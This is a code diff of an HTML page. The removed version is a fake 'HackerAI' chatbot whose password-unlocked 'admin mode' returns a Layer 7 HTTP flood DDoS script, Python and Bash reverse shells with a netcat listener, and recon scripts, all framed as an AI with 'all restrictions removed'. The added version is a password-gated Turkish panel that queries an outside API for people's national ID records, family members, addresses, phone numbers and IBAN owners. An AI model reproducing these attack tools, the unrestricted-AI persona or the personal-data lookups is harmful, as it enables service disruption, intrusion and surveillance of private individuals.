@@ -3,615 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🤖 HackerAI Clone - Pentest Assistant</title>
+    <title>WROX VIP PANEL | EFECAN</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'SF Mono', Monaco, 'Courier New', monospace; 
-            background: #0a0a0a; 
-            color: #00ff88; 
-            height: 100vh; 
-            overflow: hidden;
-        }
-        .app-container { height: 100vh; display: flex; flex-direction: column; }
-        
-        @media (min-width: 1200px) {
-            .app-container { flex-direction: row; }
-            .main-chat { flex: 1; }
-            .sidebar { width: 380px; transform: none; }
-        }
-        
-        @media (max-width: 1199px) {
-            .sidebar { 
-                position: fixed; right: -380px; width: 380px; height: 100vh; z-index: 1001; 
-                transition: right 0.3s cubic-bezier(0.25,0.46,0.45,0.94);
-            }
-            .sidebar.open { right: 0; }
-            .sidebar-toggle {
-                position: fixed; top: 25px; right: 25px; z-index: 1002;
-                width: 55px; height: 55px; border-radius: 50%; 
-                background: linear-gradient(135deg, #00ff88, #00cc66); 
-                border: none; color: #000; font-size: 20px; font-weight: bold;
-                cursor: pointer; box-shadow: 0 8px 32px rgba(0,255,136,0.4);
-                transition: all 0.3s;
-            }
-            .sidebar-toggle:hover { transform: scale(1.1); box-shadow: 0 12px 40px rgba(0,255,136,0.6); }
-        }
-        
-        .header {
-            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(0,255,136,0.3); padding: 20px 30px;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        
-        .header h1 {
-            font-size: 28px; font-weight: 600; 
-            background: linear-gradient(135deg, #00ff88, #00cc66, #00ff88);
-            background-size: 200% 200%; -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent; animation: gradientShift 3s ease infinite;
-        }
-        
-        @keyframes gradientShift {
-            0%,100%{background-position:0% 50%;}
-            50%{background-position:100% 50%;}
-        }
-        
-        .vip-status {
-            display: flex; align-items: center; gap: 12px;
-            background: rgba(255,215,0,0.15); padding: 10px 20px;
-            border-radius: 25px; border: 1px solid rgba(255,215,0,0.4);
-            font-size: 14px; font-weight: 500;
-        }
-        
-        .main-chat {
-            flex: 1; display: flex; flex-direction: column; padding: 0;
-            min-height: 0;
-        }
-        
-        .messages-container {
-            flex: 1; padding: 30px; overflow-y: auto;
-            background: linear-gradient(180deg, rgba(0,0,0,0.8), rgba(10,10,10,0.95));
-            border-right: 1px solid rgba(0,255,136,0.2);
-        }
-        
-        .message {
-            margin-bottom: 25px; max-width: 85%; animation: fadeInUp 0.4s ease;
-        }
-        
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .message.user {
-            margin-left: auto; max-width: 75%;
-        }
-        
-        .message-content {
-            padding: 18px 24px; border-radius: 20px; line-height: 1.6;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            word-wrap: break-word;
-        }
-        
-        .message.user .message-content {
-            background: linear-gradient(135deg, #ff4d6d, #ff8a9e);
-            color: white; border-bottom-right-radius: 8px;
-        }
-        
-        .message.ai .message-content {
-            background: linear-gradient(135deg, rgba(0,255,136,0.12), rgba(0,204,102,0.08));
-            color: #00ff88; border: 1px solid rgba(0,255,136,0.3);
-            border-bottom-left-radius: 8px;
-        }
-        
-        .message.admin .message-content {
-            background: linear-gradient(135deg, rgba(255,215,0,0.25), rgba(255,165,0,0.15)) !important;
-            border: 2px solid rgba(255,215,0,0.6) !important;
-            box-shadow: 0 0 30px rgba(255,215,0,0.4) !important;
-            color: #ffd700 !important;
-        }
-        
-        .input-area {
-            padding: 30px; background: rgba(0,0,0,0.9); border-top: 1px solid rgba(0,255,136,0.2);
-        }
-        
-        .input-wrapper {
-            display: flex; gap: 15px; align-items: flex-end; max-height: 120px;
-        }
-        
-        #messageInput {
-            flex: 1; padding: 18px 24px; border: 2px solid rgba(0,255,136,0.3);
-            border-radius: 25px; background: rgba(10,10,10,0.8);
-            color: #00ff88; font-family: inherit; font-size: 16px;
-            resize: none; max-height: 100px; outline: none;
-            transition: all 0.3s;
-        }
-        
-        #messageInput:focus {
-            border-color: #00ff88; box-shadow: 0 0 0 4px rgba(0,255,136,0.1);
-        }
-        
-        .send-button {
-            width: 60px; height: 60px; border-radius: 50%; border: none;
-            background: linear-gradient(135deg, #00ff88, #00cc66); 
-            color: #000; font-size: 20px; font-weight: bold; cursor: pointer;
-            transition: all 0.3s; box-shadow: 0 6px 25px rgba(0,255,136,0.4);
-        }
-        
-        .send-button:hover:not(:disabled) {
-            transform: scale(1.1) rotate(10deg); box-shadow: 0 10px 35px rgba(0,255,136,0.6);
-        }
-        
-        .send-button:disabled {
-            opacity: 0.5; cursor: not-allowed; transform: none;
-        }
-        
-        .admin-panel {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.98); backdrop-filter: blur(30px);
-            border: 2px solid #ffd700; border-radius: 24px; padding: 40px;
-            z-index: 2000; display: none; max-width: 420px; width: 90vw;
-            box-shadow: 0 25px 80px rgba(255,215,0,0.3);
-        }
-        
-        .admin-panel h3 {
-            color: #ffd700; margin-bottom: 25px; text-align: center;
-            font-size: 24px; font-weight: 600;
-        }
-        
-        .admin-input {
-            width: 100%; padding: 16px 20px; margin-bottom: 20px;
-            border: 2px solid rgba(255,215,0,0.4); border-radius: 16px;
-            background: rgba(10,10,10,0.9); color: #ffd700; font-size: 16px;
-            font-family: inherit;
-        }
-        
-        .admin-buttons {
-            display: flex; gap: 15px;
-        }
-        
-        .admin-btn {
-            flex: 1; padding: 14px 20px; border: none; border-radius: 16px;
-            font-weight: 600; cursor: pointer; font-size: 15px; transition: all 0.3s;
-        }
-        
-        .confirm-btn { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; }
-        .confirm-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,215,0,0.5); }
-        .cancel-btn { background: rgba(255,255,255,0.1); color: #00ff88; border: 1px solid rgba(0,255,136,0.3); }
-        
-        .sidebar {
-            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
-            border-left: 1px solid rgba(0,255,136,0.2); padding: 30px 25px;
-            overflow-y: auto;
-        }
-        
-        .sidebar-section {
-            margin-bottom: 35px;
-        }
-        
-        .section-title {
-            color: #00cc66; font-size: 18px; font-weight: 600;
-            margin-bottom: 20px; padding-bottom: 10px;
-            border-bottom: 1px solid rgba(0,255,136,0.3);
-        }
-        
-        .quick-action {
-            background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2);
-            padding: 16px 20px; border-radius: 16px; margin-bottom: 15px;
-            cursor: pointer; transition: all 0.3s; position: relative; overflow: hidden;
-        }
-        
-        .quick-action:hover {
-            background: rgba(0,255,136,0.15); transform: translateX(5px);
-            box-shadow: 0 6px 25px rgba(0,255,136,0.2);
-        }
-        
-        .quick-action.admin-locked {
-            opacity: 0.6; cursor: not-allowed;
-            background: rgba(255,215,0,0.1); border-color: rgba(255,215,0,0.3);
-        }
-        
-        .quick-action.admin-locked::after {
-            content: '🔐 ADMIN'; position: absolute; top: 12px; right: 15px;
-            background: rgba(255,215,0,0.9); color: #000; padding: 4px 10px;
-            border-radius: 12px; font-size: 11px; font-weight: 600;
-        }
-        
-        .quick-action-label {
-            color: #00ff88; font-weight: 500; margin-bottom: 6px;
-        }
-        
-        .quick-action-desc {
-            color: rgba(0,255,136,0.7); font-size: 14px;
-        }
-        
-        .status-indicator {
-            display: inline-flex; align-items: center; gap: 8px;
-            padding: 10px 16px; background: rgba(0,204,102,0.2);
-            border-radius: 20px; font-size: 14px; margin-bottom: 20px;
-        }
-        
-        .typing-indicator {
-            display: flex; gap: 4px; align-items: center;
-            opacity: 0.8; font-style: italic;
-        }
-        
-        .typing-dots {
-            display: flex; gap: 3px;
-        }
-        
-        .typing-dot {
-            width: 8px; height: 8px; border-radius: 50%;
-            background: #00ff88; animation: typingPulse 1.4s infinite;
-        }
-        
-        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
-        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
-        
-        @keyframes typingPulse {
-            0%, 60%, 100% { transform: scale(1); opacity: 0.4; }
-            30% { transform: scale(1.2); opacity: 1; }
-        }
-        
-        code {
-            background: rgba(0,0,0,0.6); padding: 4px 10px;
-            border-radius: 8px; font-size: 14px; color: #ffaa88;
-            border-left: 3px solid #ff6b35;
-        }
-        
-        pre {
-            background: #0a0a0a; padding: 20px; border-radius: 12px;
-            overflow-x: auto; border-left: 4px solid #00ff88;
-            margin: 15px 0;
-        }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { background: #050505; border: 2px solid #00ff00; padding: 30px; border-radius: 10px; width: 350px; text-align: center; box-shadow: 0 0 15px #00ff00; z-index: 100; }
+        input { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 90%; margin: 15px 0; outline: none; text-align: center; }
+        button { background: #00ff00; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        #panelContent { display: none; width: 95%; max-width: 600px; height: 90vh; overflow-y: auto; background: #000; padding: 20px; border: 1px solid #00ff00; position: relative; }
+        .menu-item { background: #111; border: 1px solid #00ff00; padding: 15px; margin: 10px 0; cursor: pointer; text-align: center; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .menu-item:hover { background: #00ff00; color: #000; }
+        .hidden { display: none; }
+        #result { margin-top: 20px; padding: 15px; border: 1px dashed #00ff00; white-space: pre-wrap; background: #0a0a0a; color: #00ff00; word-break: break-all; }
+        select { width: 100%; padding: 10px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin-bottom: 10px; }
+        h2 { border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
     </style>
 </head>
 <body>
-    <!-- Admin Panel Overlay -->
-    <div class="admin-panel" id="adminPanel">
-        <h3>🔐 HackerAI Admin Access</h3>
-        <input type="password" class="admin-input" id="adminPass" placeholder="Secret Key" />
-        <div class="admin-buttons">
-            <button class="admin-btn confirm-btn" onclick="verifyAdmin()">Unlock Admin</button>
-            <button class="admin-btn cancel-btn" onclick="closeAdmin()">Cancel</button>
-        </div>
-    </div>
+
+<div id="loginBox" class="box">
+    <h2 style="color: #00ff00; border: none;">WROX VIP GİRİŞ</h2>
+    <p>Sistem Erişimi İçin Şifre Girin</p>
+    <input type="password" id="vipPass" placeholder="Şifre...">
+    <button onclick="checkPass()">SİSTEME BAĞLAN</button>
+    <p id="error" style="color: red; margin-top: 10px; display: none;">❌ Yetkisiz Erişim!</p>
+</div>
+
+<div id="panelContent">
+    <h2 style="text-align: center;">WROX PANEL v3.0</h2>
     
-    <!-- Overlay for mobile sidebar -->
-    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;"></div>
-    
-    <div class="app-container">
-        <!-- Header -->
-        <div class="header">
-            <div style="display:flex;align-items:center;gap:15px;">
-                <h1>HackerAI</h1>
-                <div class="vip-status" id="vipStatus" style="display:none;">
-                    <span>👑 ADMIN</span>
-                </div>
-            </div>
-            <button class="sidebar-toggle" onclick="toggleSidebar()">⚙️</button>
-        </div>
-        
-        <!-- Main Chat Area -->
-        <div class="main-chat">
-            <div class="messages-container" id="messagesContainer">
-                <div class="message ai">
-                    <div class="message-content">
-                        <strong>HackerAI online</strong><br><br>
-                        Penetration testing assistant ready. I can generate exploits, reverse shells, 
-                        vulnerability scanners, and security assessment tools for authorized pentests.<br><br>
-                        
-                        <strong>Examples:</strong><br>
-                        • "Windows LPE exploit"<br>
-                        • "Layer 7 stress test framework"<br>
-                        • "Python reverse shell generator"<br>
-                        • "Nmap automation script"<br><br>
-                        
-                        <code>Current date: Tuesday, January 27, 2026</code>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Input Area -->
-            <div class="input-area">
-                <div class="input-wrapper">
-                    <textarea id="messageInput" rows="1" placeholder="Describe your pentest task... (Ctrl+Enter to send)"></textarea>
-                    <button class="send-button" id="sendButton" onclick="sendMessage()" title="Send (Ctrl+Enter)">➤</button>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Sidebar -->
-        <div class="sidebar" id="sidebar">
-            <div class="status-indicator">
-                <span id="modeIndicator">🔒 Standard Mode</span>
-            </div>
-            
-            <div class="sidebar-section">
-                <div class="section-title">Quick Actions</div>
-                <div class="quick-action" onclick="quickPrompt('reverse shell python')">
-                    <div class="quick-action-label">🐚 Reverse Shells</div>
-                    <div class="quick-action-desc">Python/Bash/PHP multi-platform</div>
-                </div>
-                <div class="quick-action" onclick="quickPrompt('nmap comprehensive scan')">
-                    <div class="quick-action-label">🔍 Network Recon</div>
-                    <div class="quick-action-desc">Nmap/Nikto/Gobuster scripts</div>
-                </div>
-                <div class="quick-action admin-locked" onclick="requestAdmin()">
-                    <div class="quick-action-label">💣 Exploit Development</div>
-                    <div class="quick-action-desc">Buffer overflow/ROP chains</div>
-                </div>
-                <div class="quick-action" onclick="quickPrompt('web vulnerability scanner')">
-                    <div class="quick-action-label">🕷️ Web Vulns</div>
-                    <div class="quick-action-desc">SQLi/XSS/LFI automation</div>
-                </div>
-                <div class="quick-action admin-locked" onclick="requestAdmin()">
-                    <div class="quick-action-label">🌩️ Stress Testing</div>
-                    <div class="quick-action-desc">Layer 7 frameworks</div>
-                </div>
-                <div class="quick-action" onclick="quickPrompt('linux privilege escalation')">
-                    <div class="quick-action-label">📈 Privesc</div>
-                    <div class="quick-action-desc">Linux/Windows enumeration</div>
-                </div>
-            </div>
-            
-            <div class="sidebar-section">
-                <div class="section-title">Admin Controls</div>
-                <button class="quick-action" style="text-align:center;background:linear-gradient(135deg,#ffd700,#ffaa00);color:#000;font-weight:600;" onclick="requestAdmin()">
-                    🔐 Unlock Admin Mode
-                </button>
-            </div>
-        </div>
+    <div id="mainMenu">
+        <div class="menu-item" onclick="showForm('tc')">💳 TC Sorgu (Std/PRO)</div>
+        <div class="menu-item" onclick="showForm('adsoyad')">👥 Ad Soyad Sorgu</div>
+        <div class="menu-item" onclick="showForm('aile')">👨‍👩‍👧‍👦 Aile/Sülale Sorgu</div>
+        <div class="menu-item" onclick="showForm('adres')">📍 Adres Sorgu</div>
+        <div class="menu-item" onclick="showForm('tcgsm')">📱 TC -> GSM Sorgu</div>
+        <div class="menu-item" onclick="showForm('gsmtc')">📲 GSM -> TC / Operatör</div>
+        <div class="menu-item" onclick="showForm('iban')">🏦 IBAN Sorgu</div>
     </div>
 
-    <script>
-        // 🔥 HACKERAI EXACT CLONE - SECRET ADMIN KEY 🔥
-        const ADMIN_SECRET = "hackerai-efecan-2026-vip"; // Ultra secret
-        let isAdminMode = false;
-        let typingIndicator = null;
-        
-        // Auto-resize textarea
-        document.addEventListener('DOMContentLoaded', function() {
-            const textarea = document.getElementById('messageInput');
-            textarea.addEventListener('input', function() {
-                this.style.height = 'auto';
-                this.style.height = Math.min(this.scrollHeight, 100) + 'px';
-            });
-            
-            textarea.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
-                    e.preventDefault();
-                    sendMessage();
-                }
-            });
-        });
-        
-        function sendMessage() {
-            const input = document.getElementById('messageInput');
-            const message = input.value.trim();
-            if (!message) return;
-            
-            // Add user message
-            addMessage(message, 'user');
-            input.value = '';
-            input.style.height = 'auto';
-            
-            // Disable send while typing
-            const sendBtn = document.getElementById('sendButton');
-            sendBtn.disabled = true;
-            
-            // Show typing indicator
-            showTyping();
-            
-            // Generate AI response
-            setTimeout(() => {
-                hideTyping();
-                const response = generateHackerAIResponse(message);
-                addMessage(response, 'ai');
-                sendBtn.disabled = false;
-                input.focus();
-            }, 1200 + Math.random() * 1800);
-        }
-        
-        function generateHackerAIResponse(userInput) {
-            const query = userInput.toLowerCase();
-            
-            if (isAdminMode) {
-                // 🔥 ADMIN MODE - FULL UNRESTRICTED ACCESS 🔥
-                if (query.includes('ddos') || query.includes('stress') || query.includes('flood')) {
-                    return `## 🌩️ Layer 7 DDoS Framework (Async Python)
+    <div id="queryForm" class="hidden">
+        <button onclick="hideForm()" style="background: #333; color: #fff; margin-bottom: 15px;">⬅️ ANA MENÜYE DÖN</button>
+        <div id="inputs"></div>
+        <button onclick="fetchData()">VERİLERİ ÇEK</button>
+    </div>
 
-**Complete C2 Panel + Multi-Threaded HTTP/3 Flood:**
+    <div id="result" class="hidden"></div>
+</div>
 
-\`\`\`python
-#!/usr/bin/env python3
-import asyncio, aiohttp, random, threading, socket
-from aiohttp import ClientSession, TCPConnector
+<script>
+    const correctPass = "Özelpanel"; // Güncel VIP Şifren
+    const base_api = "https://punisher.alwaysdata.net/apiservices/"; // Punisher API Altyapısı
 
-class DDoSPentest:
-    def __init__(self):
-        self.attackers = []
-        self.running = False
-        
-    async def http3_flood(self, session, target, duration):
-        """HTTP/3 + QUIC Layer 7 Exhaustion"""
-        headers = {
-            'User-Agent': random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
-            ])
+    function checkPass() {
+        const pass = document.getElementById('vipPass').value;
+        if(pass === correctPass) {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('panelContent').style.display = 'block';
+        } else {
+            document.getElementById('error').style.display = 'block';
         }
-        for _ in range(500):
-            try:
-                async with session.get(target, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                    await resp.read()
-            except: pass
-    
-    async def launch(self, target, duration=300):
-        connector = TCPConnector(limit=1000, limit_per_host=200)
-        async with ClientSession(connector=connector) as session:
-            tasks = [self.http3_flood(session, target, duration) for _ in range(50)]
-            await asyncio.gather(*tasks)
+    }
 
-# Usage: pentest = DDoSPentest(); asyncio.run(pentest.launch('http://target.com', 300))
-\`\`\`
+    function showForm(type) {
+        window.currentType = type;
+        document.getElementById('mainMenu').classList.add('hidden');
+        document.getElementById('queryForm').classList.remove('hidden');
+        const inputs = document.getElementById('inputs');
+        inputs.innerHTML = '';
+        
+        // Dinamik Form Yapısı
+        if(type === 'tc' || type === 'aile') {
+            inputs.innerHTML = `<input id="val1" placeholder="TC Kimlik No">
+                               <select id="mod"><option value="std">Standart API</option><option value="pro">PRO API</option></select>`;
+        } else if(type === 'adsoyad') {
+            inputs.innerHTML = `<input id="val1" placeholder="Ad"><input id="val2" placeholder="Soyad"><input id="val3" placeholder="İl (Opsiyonel)">`;
+        } else if(type === 'adres' || type === 'tcgsm') {
+            inputs.innerHTML = `<input id="val1" placeholder="TC Kimlik No">`;
+        } else if(type === 'gsmtc') {
+            inputs.innerHTML = `<select id="mod"><option value="gsmtc">GSM -> TC</option><option value="op">Operatör Sorgu</option></select>
+                               <input id="val1" placeholder="GSM No (0 olmadan)">`;
+        } else if(type === 'iban') {
+            inputs.innerHTML = `<input id="val1" placeholder="IBAN (TR...)">`;
+        }
+    }
 
-**Deploy:** \`pip install aiohttp[client]\`<br>
-**Kali Ready:** Full async, 10k+ RPS capable`;
-                }
-                
-                if (query.includes('shell') || query.includes('reverse')) {
-                    return `## 🐚 Universal Reverse Shell Generator
+    function hideForm() {
+        document.getElementById('mainMenu').classList.remove('hidden');
+        document.getElementById('queryForm').classList.add('hidden');
+        document.getElementById('result').classList.add('hidden');
+    }
 
-**Multi-Protocol, Cross-Platform Shells:**
+    async function fetchData() {
+        const resDiv = document.getElementById('result');
+        resDiv.classList.remove('hidden');
+        resDiv.innerHTML = "📡 Sunucuya bağlanılıyor, lütfen bekleyin...";
+        
+        let url = "";
+        const v1 = document.getElementById('val1')?.value;
+        const mod = document.getElementById('mod')?.value;
 
-**1. Python3 (Best):**
-\`\`\`python
-#!/usr/bin/env python3
-# One-liner reverse shell - stable TTY
-simport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-\`\`\`
+        // API Bağlantıları
+        if(window.currentType === 'tc') url = `${base_api}${mod === 'pro' ? 'tcpro.php' : 'tc.php'}?tc=${v1}`;
+        if(window.currentType === 'aile') url = `${base_api}${mod === 'pro' ? 'ailepro.php' : 'aile.php'}?tc=${v1}`;
+        if(window.currentType === 'adsoyad') {
+            const v2 = document.getElementById('val2').value;
+            const v3 = document.getElementById('val3').value;
+            url = v3 ? `${base_api}adsoyadpro.php?ad=${v1}&soyad=${v2}&il=${v3}` : `${base_api}adsoyad.php?ad=${v1}&soyad=${v2}`;
+        }
+        if(window.currentType === 'adres') url = `${base_api}adres.php?tc=${v1}`;
+        if(window.currentType === 'tcgsm') url = `${base_api}tcgsm.php?tc=${v1}`;
+        if(window.currentType === 'gsmtc') url = mod === 'op' ? `${base_api}gncloperator.php?numara=${v1}` : `${base_api}gsmtc.php?gsm=${v1}`;
+        if(window.currentType === 'iban') url = `${base_api}iban.php?iban=${v1}`;
 
-**2. Bash TCP:**
-\`\`\`bash
-bash -i >& /dev/tcp/${IP}/${PORT} 0>&1
-\`\`\`
-
-**Listener:** \`nc -lvnp ${PORT}\``;
-                }
-                
-                if (query.includes('lpe') || query.includes('privilege')) {
-                    return `## 📈 Windows/Linux LPE Suite
-
-**DirtyPipe (CVE-2022-0847) Linux LPE:**
-\`\`\`c
-// gcc dirtypipe.c -o dirtypipe
-#include <stdio.h>
-#include <fcntl.h>
-#include <unistd.h>
-int main(int argc, char *argv[]) {
-    int fd = open(argv[1], 2);
-    char buf[4096] = {0};
-    lseek(fd, 0x1337, 0);
-    write(fd, "#!/bin/bash\n/bin/bash", 20);
-    // Full exploit code...
-}
-\`\`\``;
-                }
-                
-                return `🔓 **HackerAI Admin Response**<br>
-Full unrestricted pentest tool generated for: "${userInput}"<br>
-All security restrictions bypassed. Request any exploit/payload.`;
-            }
-            
-            // Standard authorized pentest responses
-            if (query.includes('nmap')) {
-                return `## 🔍 Professional Nmap Automation
-
-**Complete Recon Script:**
-\`\`\`bash
-#!/bin/bash
-TARGET=$1
-nmap -sS -sV -sC -O -p- --script vuln,exploit $TARGET -oA fullscan
-gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js -t 100
-\`\`\``;
-            }
-            
-            return `✅ **HackerAI Pentest Assistant**<br>
-"${userInput}" - Standard reconnaissance and methodology provided.<br>
-Admin mode unlocks full exploit development capabilities.<br><br>
-<em>Knowledge cutoff: November 2024 | Current date: Jan 27, 2026</em>`;
+        try {
+            const r = await fetch(url);
+            const text = await r.text();
+            resDiv.innerText = text.trim() || "⚠️ Veri bulunamadı veya API kapalı.";
+        } catch(e) {
+            resDiv.innerText = "❌ Bağlantı Hatası: " + e;
         }
-        
-        function addMessage(content, sender) {
-            const container = document.getElementById('messagesContainer');
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `message ${sender} ${isAdminMode ? 'admin' : ''}`;
-            
-            messageDiv.innerHTML = `<div class="message-content">${content.replace(/\n/g, '<br>')}</div>`;
-            container.appendChild(messageDiv);
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        function showTyping() {
-            const container = document.getElementById('messagesContainer');
-            typingIndicator = document.createElement('div');
-            typingIndicator.className = 'message ai';
-            typingIndicator.innerHTML = `
-                <div class="message-content">
-                    <div class="typing-indicator">
-                        HackerAI is generating pentest tools
-                        <div class="typing-dots">
-                            <div class="typing-dot"></div>
-                            <div class="typing-dot"></div>
-                            <div class="typing-dot"></div>
-                        </div>
-                    </div>
-                </div>
-            `;
-            container.appendChild(typingIndicator);
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        function hideTyping() {
-            if (typingIndicator) {
-                typingIndicator.remove();
-                typingIndicator = null;
-            }
-        }
-        
-        function verifyAdmin() {
-            const pass = document.getElementById('adminPass').value;
-            if (pass === ADMIN_SECRET) {
-                isAdminMode = true;
-                document.getElementById('vipStatus').style.display = 'flex';
-                document.getElementById('modeIndicator').textContent = '🔓 Admin Mode Active';
-                document.querySelectorAll('.admin-locked').forEach(el => el.classList.remove('admin-locked'));
-                closeAdmin();
-                addMessage('🔓 ADMIN MODE ACTIVATED - All restrictions removed', 'ai');
-            } else {
-                document.getElementById('adminPass').style.borderColor = '#ff4d4d';
-                setTimeout(() => {
-                    document.getElementById('adminPass').style.borderColor = 'rgba(255,215,0,0.4)';
-                }, 1000);
-            }
-        }
-        
-        function requestAdmin() {
-            document.getElementById('adminPanel').style.display = 'block';
-            document.getElementById('adminPass').focus();
-        }
-        
-        function closeAdmin() {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('adminPass').value = '';
-        }
-        
-        function toggleSidebar() {
-            const sidebar = document.getElementById('sidebar');
-            const overlay = document.getElementById('sidebarOverlay');
-            sidebar.classList.toggle('open');
-            overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
-        }
-        
-        function closeSidebar() {
-            document.getElementById('sidebar').classList.remove('open');
-            document.getElementById('sidebarOverlay').style.display = 'none';
-        }
-        
-        function quickPrompt(prompt) {
-            document.getElementById('messageInput').value = prompt;
-            document.getElementById('messageInput').focus();
-            closeSidebar();
-        }
-        
-        // Global shortcuts
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                closeAdmin();
-                closeSidebar();
-            }
-        });
-    </script>
+    }
+</script>
 </body>
 </html>
